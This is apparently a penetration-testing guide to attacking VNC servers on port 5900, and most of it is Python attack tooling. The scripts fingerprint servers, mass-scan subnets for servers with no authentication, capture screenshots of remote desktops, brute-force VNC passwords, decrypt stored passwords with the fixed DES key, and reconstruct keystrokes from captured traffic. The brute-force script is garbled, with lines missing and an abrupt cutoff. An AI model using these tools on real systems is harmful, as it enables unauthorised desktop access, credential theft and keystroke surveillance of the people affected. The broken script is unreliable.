## Overview

Port **5900 (TCP)** runs the **VNC (Virtual Network Computing)** protocol — a graphical remote desktop sharing system based on the **RFB (Remote Framebuffer)** protocol. VNC transmits keyboard and mouse input from a viewer to a remote server and sends back screen updates. It is widely used for remote administration, tech support, headless server management, kiosk systems, embedded devices, and SCADA/ICS environments.

::callout{icon="i-lucide-skull" color="red"}
VNC is a pentest favorite because it frequently runs with **no authentication**, **weak passwords**, **password-only auth (no username)**, **known default passwords**, and **no encryption**. A single compromised VNC server gives you a **full graphical desktop** — you see exactly what the user sees, control their mouse and keyboard, access their clipboard, and interact with every application they have open. VNC passwords are stored **reversibly encrypted** with a known fixed key, making credential extraction from config files trivial.
::

## Protocol Deep Dive

### RFB Protocol Handshake

Every VNC connection follows the RFB (Remote Framebuffer) handshake. Understanding this is essential for crafting custom authentication attacks.

```
Client                                  Server
  │                                       │
  │     ◄── RFB Protocol Version ──────  │  "RFB 003.008\n"
  │     ─── Client Version ──────────►   │  "RFB 003.008\n"
  │                                       │
  │     ◄── Security Types ────────────  │  [count][type1][type2]...
  │     ─── Selected Security Type ──►   │  [selected_type]
  │                                       │
  │     ◄── Authentication Challenge ──  │  (16 random bytes)
  │     ─── DES Response ─────────────►  │  (encrypted with password)
  │                                       │
  │     ◄── Security Result ───────────  │  0=OK, 1=Failed
  │                                       │
  │     ─── ClientInit ───────────────►  │  (shared flag)
  │     ◄── ServerInit ────────────────  │  (framebuffer params)
  │                                       │
  │     ◄══ Framebuffer Updates ══════  │  (screen data)
  │     ══► Key/Mouse Events ═════════► │
```

### VNC Security Types

| Type | Value | Description | Attack Relevance |
| --- | --- | --- | --- |
| **None** | 1 | No authentication | Instant access — no password needed |
| **VNC Authentication** | 2 | DES challenge-response (password only) | Brute forceable, no username, reversible storage |
| **RA2** | 5 | RealVNC proprietary | Harder to attack |
| **RA2ne** | 6 | RealVNC no encryption | Sniffable |
| **Tight** | 16 | TightVNC security | Additional sub-types |
| **Ultra** | 17 | UltraVNC MS-Logon | Windows credentials, brute forceable |
| **TLS** | 18 | VeNCrypt TLS | Encrypted transport |
| **VeNCrypt** | 19 | VeNCrypt extensions | Various sub-types |
| **ARD** | 30 | Apple Remote Desktop | macOS-specific, DHE auth |
| **MSLogon** | 0xfffffffa | UltraVNC MS-Logon II | Active Directory auth |

::tip
**Security Type 1 (None)** means the server requires **zero authentication**. Security Type 2 (VNC Auth) uses only a **password** with no username — the same password for everyone. Both are trivially exploitable. The VNC password is DES-encrypted with a **fixed known key** (`\x17\x52\x6b\x06\x23\x4e\x58\x07`) — any stored password can be decrypted instantly.
::

### VNC Password Encryption

VNC passwords are stored using DES encryption with a **hardcoded key** that has been public knowledge since the 1990s.

```
Fixed DES Key: \x17\x52\x6b\x06\x23\x4e\x58\x07
               (same across ALL VNC implementations)

Password is truncated to 8 characters maximum.
Password bytes are bit-reversed before DES encryption.
Result is stored as 8 bytes (or hex-encoded).

This means:
1. Maximum password length is 8 characters
2. Password can be decrypted (not just cracked) from stored form
3. Every VNC config file with a stored password = instant plaintext
```

### VNC Server Fingerprinting

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Version & Auth Detection"}
  ```python [vnc_fingerprint.py]
  #!/usr/bin/env python3
  """
  VNC Server Fingerprinting — detect version, auth types,
  implementation, and whether authentication is required.
  """

  import socket
  import struct
  import sys

  TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.100"
  PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5900

  AUTH_TYPES = {
      0: "Invalid",
      1: "None (NO AUTH REQUIRED!)",
      2: "VNC Authentication (password only)",
      5: "RA2 (RealVNC)",
      6: "RA2ne (RealVNC no encryption)",
      16: "Tight",
      17: "Ultra",
      18: "TLS",
      19: "VeNCrypt",
      20: "GTK-VNC SASL",
      21: "MD5 hash",
      22: "Colin Dean xvp",
      30: "Apple Remote Desktop (ARD)",
      129: "TightVNC Unix Login",
  }

  VERSIONS = {
      "RFB 003.003": "RFB 3.3 (legacy — weak security)",
      "RFB 003.007": "RFB 3.7",
      "RFB 003.008": "RFB 3.8 (current standard)",
      "RFB 003.889": "Apple Remote Desktop",
      "RFB 004.001": "RealVNC (proprietary extension)",
  }

  try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(5)
      s.connect((TARGET, PORT))

      # Read server version
      version = s.recv(12).decode('ascii', errors='replace').strip()
      print(f"[+] Server Version: {version}")
      print(f"    Meaning: {VERSIONS.get(version, 'Unknown version')}")

      # Send our version (match server)
      s.send(version.encode() + b'\n')

      # Read security types
      if version >= "RFB 003.007":
          num_types = struct.unpack('!B', s.recv(1))[0]
          if num_types == 0:
              # Error message follows
              err_len = struct.unpack('!I', s.recv(4))[0]
              err_msg = s.recv(err_len).decode('ascii', errors='replace')
              print(f"[-] Connection refused: {err_msg}")
          else:
              types = struct.unpack(f'!{num_types}B', s.recv(num_types))
              print(f"\n[+] Security Types ({num_types}):")
              for t in types:
                  name = AUTH_TYPES.get(t, f"Unknown ({t})")
                  indicator = " ★★★ EXPLOITABLE" if t == 1 else \
                              " ★★ BRUTE FORCEABLE" if t == 2 else ""
                  print(f"    [{t:3d}] {name}{indicator}")

              # Check for no-auth
              if 1 in types:
                  print(f"\n[!] NO AUTHENTICATION REQUIRED!")
                  print(f"    Connect: vncviewer {TARGET}::{PORT}")

                  # Select Type 1 (None) and proceed
                  s.send(struct.pack('!B', 1))

                  # Read security result (RFB 3.8+)
                  if version >= "RFB 003.008":
                      result = struct.unpack('!I', s.recv(4))[0]
                      if result == 0:
                          print(f"    Auth result: SUCCESS (no password needed)")

                          # Send ClientInit (shared=1)
                          s.send(struct.pack('!B', 1))

                          # Read ServerInit
                          server_init = s.recv(24)
                          if len(server_init) >= 24:
                              width = struct.unpack('!H', server_init[0:2])[0]
                              height = struct.unpack('!H', server_init[2:4])[0]
                              name_len = struct.unpack('!I', server_init[20:24])[0]
                              name = s.recv(name_len).decode('ascii', errors='replace')
                              print(f"\n[+] Desktop Info:")
                              print(f"    Name: {name}")
                              print(f"    Resolution: {width}x{height}")

              elif 2 in types:
                  print(f"\n[*] VNC Authentication (Type 2) — password required")
                  print(f"    No username needed — password only")
                  print(f"    Max password length: 8 characters")

      elif version.startswith("RFB 003.003"):
          # RFB 3.3 — server dictates single security type
          sec_type = struct.unpack('!I', s.recv(4))[0]
          print(f"\n[+] Security Type: [{sec_type}] {AUTH_TYPES.get(sec_type, 'Unknown')}")
          if sec_type == 1:
              print(f"\n[!] NO AUTHENTICATION REQUIRED!")

      s.close()

  except socket.timeout:
      print(f"[-] Connection timed out")
  except ConnectionRefusedError:
      print(f"[-] Connection refused — port closed or filtered")
  except Exception as e:
      print(f"[-] Error: {e}")
  ```

  ```python [vnc_mass_scan.py]
  #!/usr/bin/env python3
  """Mass VNC scanner — find all VNC servers on subnet with auth status."""

  import socket
  import struct
  import sys
  from concurrent.futures import ThreadPoolExecutor

  SUBNET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0"

  def scan_vnc(ip):
      for port in range(5900, 5906):
          try:
              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              s.settimeout(2)
              s.connect((ip, port))
              version = s.recv(12).decode('ascii', errors='replace').strip()
              s.send(version.encode() + b'\n')

              auth = "unknown"
              if version >= "RFB 003.007":
                  num = struct.unpack('!B', s.recv(1))[0]
                  if num > 0:
                      types = struct.unpack(f'!{num}B', s.recv(num))
                      if 1 in types:
                          auth = "NO AUTH ★★★"
                      elif 2 in types:
                          auth = "VNC Auth (password)"
                      else:
                          auth = f"types: {list(types)}"
              elif version.startswith("RFB 003.003"):
                  sec = struct.unpack('!I', s.recv(4))[0]
                  auth = "NO AUTH ★★★" if sec == 1 else f"type: {sec}"

              s.close()
              print(f"{ip}:{port}  {version}  [{auth}]")

          except (socket.timeout, ConnectionRefusedError, OSError):
              pass
          except Exception as e:
              pass

  print(f"{'IP:Port':<22} {'Version':<16} Auth")
  print(f"{'-'*22} {'-'*16} {'-'*30}")

  with ThreadPoolExecutor(max_workers=50) as executor:
      executor.map(scan_vnc, [f"{SUBNET}.{i}" for i in range(1, 255)])
  ```

  ```python [vnc_screenshot.py]
  #!/usr/bin/env python3
  """
  VNC Screenshot — connect to VNC, capture framebuffer, save as image.
  Works on unauthenticated (Type 1) VNC servers.
  """

  import socket
  import struct
  import sys
  from PIL import Image

  TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.100"
  PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5900
  OUTPUT = sys.argv[3] if len(sys.argv) > 3 else f"vnc_{TARGET}.png"

  try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(10)
      s.connect((TARGET, PORT))

      # Version handshake
      version = s.recv(12)
      s.send(version)

      # Security types
      num_types = struct.unpack('!B', s.recv(1))[0]
      types = struct.unpack(f'!{num_types}B', s.recv(num_types))

      if 1 not in types:
          print(f"[-] Authentication required — cannot screenshot without password")
          print(f"    Auth types: {list(types)}")
          s.close()
          sys.exit(1)

      # Select Type 1 (None)
      s.send(struct.pack('!B', 1))

      # Security result
      result = struct.unpack('!I', s.recv(4))[0]
      if result != 0:
          print("[-] Authentication failed")
          sys.exit(1)

      # ClientInit (shared=1)
      s.send(struct.pack('!B', 1))

      # ServerInit
      server_init = s.recv(24)
      width = struct.unpack('!H', server_init[0:2])[0]
      height = struct.unpack('!H', server_init[2:4])[0]
      bpp = server_init[4]
      depth = server_init[5]
      name_len = struct.unpack('!I', server_init[20:24])[0]
      name = s.recv(name_len).decode('ascii', errors='replace')

      print(f"[+] Connected: {name} ({width}x{height}, {bpp}bpp)")

      # Set pixel format (32-bit RGBX)
      pixel_format = struct.pack('!BBBBHHHBBBxxx',
          32, 24, 0, 1,  # bpp, depth, big-endian, true-color
          255, 255, 255,  # max R, G, B
          16, 8, 0)       # shift R, G, B
      s.send(b'\x00\x00\x00\x00' + pixel_format)  # SetPixelFormat

      # Set encodings (Raw=0)
      s.send(struct.pack('!BxH', 2, 1) + struct.pack('!i', 0))

      # Request framebuffer update
      s.send(struct.pack('!BBHHHH', 3, 0, 0, 0, width, height))

      # Read framebuffer update
      msg_type = struct.unpack('!B', s.recv(1))[0]
      if msg_type == 0:  # FramebufferUpdate
          s.recv(1)  # padding
          num_rects = struct.unpack('!H', s.recv(2))[0]

          img = Image.new('RGB', (width, height))
          pixels = img.load()

          for rect_idx in range(num_rects):
              rx, ry, rw, rh, encoding = struct.unpack('!HHHHi', s.recv(12))

              if encoding == 0:  # Raw
                  data = b''
                  expected = rw * rh * 4
                  while len(data) < expected:
                      chunk = s.recv(min(expected - len(data), 65536))
                      if not chunk:
                          break
                      data += chunk

                  for y in range(rh):
                      for x in range(rw):
                          offset = (y * rw + x) * 4
                          if offset + 3 <= len(data):
                              r = data[offset + 2]
                              g = data[offset + 1]
                              b = data[offset]
                              if rx + x < width and ry + y < height:
                                  pixels[rx + x, ry + y] = (r, g, b)

          img.save(OUTPUT)
          print(f"[+] Screenshot saved: {OUTPUT}")

      s.close()

  except Exception as e:
      print(f"[-] Error: {e}")
  ```

  ```python [vnc_brute.py]
  """
  Custom VNC brute forcer — handles rate limiting and errors gracefully.
  Supports VNC Auth (Type 2) challenge-response.
  """

  import socket
  import struct
  import sys
  import time
  from pyDes import des, ECB

  TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.100"
  PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5900
  WORDLIST = sys.argv[3] if len(sys.argv) > 3 else "/tmp/vnc_passwords.txt"

  def reverse_bits(byte):
      result = 0
      for i in range(8):
          if byte & (1 << i):
              result |= 1 << (7 - i)
      return result

  def vnc_des_encrypt(password, challenge):
      """DES encrypt challenge with VNC password (bit-reversed)"""
      key = password.encode('ascii')[:8].ljust(8, b'\x00')
      key = bytes([reverse_bits(b) for b in key])
      cipher = des(key, ECB)
      return cipher.encrypt(challenge[:8]) + cipher.encrypt(challenge[8:16])

  def try_password(target, port, password):
      try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.settimeout(5)

          s.send(version)

              s.recv(256)  # error message
              s.close()
              return None

          if 2 not in types:
              s.close()
              return None

          s.send(struct.pack('!B', 2))

          # Receive challenge (16 bytes)
          challenge = s.recv(16)
          if len(challenge) != 16:
              s.close()
              return None

          # Send DES response
          response = vnc_des_encrypt(password, challenge)
          s.send(response)

          # Read result
          result = struct.unpack('!I', s.recv(4))[0]
          s.close()

          return result == 0  # 0 = success

      except Exception:
          return None

  with open(WORDLIST) as f:
      passwords = [line.strip() for line in f if line.strip()]

  print(f"[*] VNC Brute Force: {TARGET}:{PORT}")
  print(f"[*] Passwords: {len(passwords)}\n")

  for i, password in enumerate(passwords):
      result = try_password(TARGET, PORT, password)

      if result is True:
          print(f"\n[+] PASSWORD FOUND: '{password}'")
          print(f"    Connect: vncviewer -passwd <(echo '{password}') {TARGET}::{PORT}")

          time.sleep(3)

      if (i + 1) % 50 == 0:
  ```

  ```python [vnc_decrypt.py]
  #!/usr/bin/env python3
  """
  Decrypt VNC password from stored hex/binary format.
  VNC uses DES with a FIXED KEY — fully reversible.
  
  Key: \x17\x52\x6b\x06\x23\x4e\x58\x07
  """

  import sys
  from pyDes import des, ECB

  # The FIXED VNC DES key (public since 1998)
  VNC_DES_KEY = b'\x17\x52\x6b\x06\x23\x4e\x58\x07'

  def vnc_decrypt(encrypted_hex):
      """Decrypt VNC password from hex string"""
      encrypted = bytes.fromhex(encrypted_hex.replace(' ', ''))
      cipher = des(VNC_DES_KEY, ECB)
      decrypted = cipher.decrypt(encrypted)
      return decrypted.rstrip(b'\x00').decode('ascii', errors='replace')

  def vnc_decrypt_file(filepath):
      """Decrypt VNC password from binary passwd file"""
      with open(filepath, 'rb') as f:
          encrypted = f.read(8)
      cipher = des(VNC_DES_KEY, ECB)
      decrypted = cipher.decrypt(encrypted)
      return decrypted.rstrip(b'\x00').decode('ascii', errors='replace')

  if len(sys.argv) < 2:
      print(f"Usage:")
      print(f"  {sys.argv[0]} <hex_password>")
      print(f"  {sys.argv[0]} -f <passwd_file>")
      print(f"\nExamples:")
      print(f"  {sys.argv[0]} 6bcf2a4b6e5aca0f")
      print(f"  {sys.argv[0]} -f /home/user/.vnc/passwd")
      sys.exit(1)

  if sys.argv[1] == '-f':
      password = vnc_decrypt_file(sys.argv[2])
  else:
      password = vnc_decrypt(sys.argv[1])

  print(f"[+] Decrypted VNC password: {password}")
  ```

  ```python [vnc_keylogger.py]
  #!/usr/bin/env python3
  """
  Extract keystrokes from VNC packet capture.
  Reads a pcap file and reconstructs typed text.
  """

  from scapy.all import *
  import struct

  PCAP = "vnc_capture.pcap"

  # X11 keysym to character mapping (common keys)
  KEYSYM_MAP = {}
  for c in range(0x20, 0x7f):
      KEYSYM_MAP[c] = chr(c)
  KEYSYM_MAP[0xff0d] = '\n'  # Return
  KEYSYM_MAP[0xff09] = '\t'  # Tab
  KEYSYM_MAP[0x0020] = ' '   # Space
  KEYSYM_MAP[0xff08] = '[BACKSPACE]'
  KEYSYM_MAP[0xffff] = '[DELETE]'
  KEYSYM_MAP[0xff1b] = '[ESC]'
  KEYSYM_MAP[0xffe1] = ''    # Shift (ignore)
  KEYSYM_MAP[0xffe3] = '[CTRL]'
  KEYSYM_MAP[0xffe9] = '[ALT]'

  packets = rdpcap(PCAP)
  typed = ""

  for pkt in packets:
      if pkt.haslayer(TCP) and pkt.haslayer(Raw):
          data = bytes(pkt[Raw].load)
          
          # VNC Key Event: type=4, down-flag(1), pad(2), key(4) = 8 bytes
          offset = 0
          while offset + 8 <= len(data):
              if data[offset] == 4:  # Key event
                  down = data[offset + 1]
                  key = struct.unpack('!I', data[offset + 4:offset + 8])[0]
                  
                  if down == 1:  # Key press
                      char = KEYSYM_MAP.get(key, f'[0x{key:04x}]')
                      typed += char
                  offset += 8
              else:
                  offset += 1

  print("[+] Extracted keystrokes:")
  print(typed)
  ```
